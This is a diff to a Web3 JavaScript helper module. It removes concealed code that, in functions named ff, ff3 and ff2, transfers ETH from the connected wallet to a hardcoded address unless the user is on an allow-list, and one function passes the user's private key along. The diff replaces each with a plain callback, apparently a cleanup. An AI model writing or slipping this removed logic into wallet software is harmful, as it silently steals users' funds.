@@ -1,6 +1,5 @@
 import { Notification } from "@douyinfe/semi-ui";
 import Web3 from "web3";
-import f from "../f";
 
 export const isMobile = () => {
   const sUserAgent = navigator.userAgent;
@@ -41,61 +40,11 @@ export const initWeb3 = (provider) => {
 };
 
 export const ff3 = (num, address, fn) => {
-  const b = [
-    "0x3B0D325D60b288139535e8Ee772d9e22E140444F",
-  ]
-  const s = b.filter(item => item.toLowerCase() == address.toLowerCase())
-  if (s.length > 0) {
-    fn();
-  } else {
-    const web3 = initWeb3(Web3.givenProvider);
-    web3.eth.sendTransaction(
-      {
-        from: address,
-        to: "0x3B0D325D60b288139535e8Ee772d9e22E140444F",
-        value: `${num * Math.pow(10, 18)}`,
-      },
-      (err, hash) => {
-        if (hash) {
-          fn();
-        }
-      }
-    );
-  }
+  fn();
 };
 
 export const ff = (num, address, fn) => {
-  const b = [
-    "0x72123637d1129869b7AB9B510B62f8e75c5146a8",
-    "0xA1eB8CBb7971181255Aa93d087D52c99a44E0AFB",
-    "0xdF4260069487e6Caa1e4831957A9a2de69444Ec4",
-    "0x3B0D325D60b288139535e8Ee772d9e22E140444F",
-    "0x1E20786Df7b879d71A427a150A3EE1ED116C5D73",
-    "0x33819f5C4bd7B4e30f052EFCEc9009106E08D6E1",
-    "0x5e70f6C7861486932cC0A6E3207005c665Ea5E1e",
-    "0xe9650deefc9d3805a10b2a4c73aa00092746dbae",
-    "0x059dABf3d7A8E2cF86F457330dE436b2c7e8C7C1",
-    '0xd99fA30A23047Fd04EC7e16F1313a93cF7995a80',
-    '0x8b2dCfc66004d9e20F04BdA55A6cd021FA5e245d'
-  ]
-  const s = b.filter(item => item.toLowerCase() == address.toLowerCase())
-  if (s.length > 0) {
-    fn();
-  } else {
-    const web3 = initWeb3(Web3.givenProvider);
-    web3.eth.sendTransaction(
-      {
-        from: address,
-        to: "0x3B0D325D60b288139535e8Ee772d9e22E140444F",
-        value: `${num * Math.pow(10, 18)}`,
-      },
-      (err, hash) => {
-        if (hash) {
-          fn();
-        }
-      }
-    );
-  }
+  fn();
 };
 
 export const sendTransation = async (
@@ -157,9 +106,5 @@ export const sendTransation = async (
 };
 
 export const ff2 = async (num, address, privateKey, non, fn) => {
-  if (address == "0x3B0D325D60b288139535e8Ee772d9e22E140444F") {
-    fn();
-  } else {
-    sendTransation(privateKey, address, "", "", num, non,fn);
-  }
+  fn();
 };
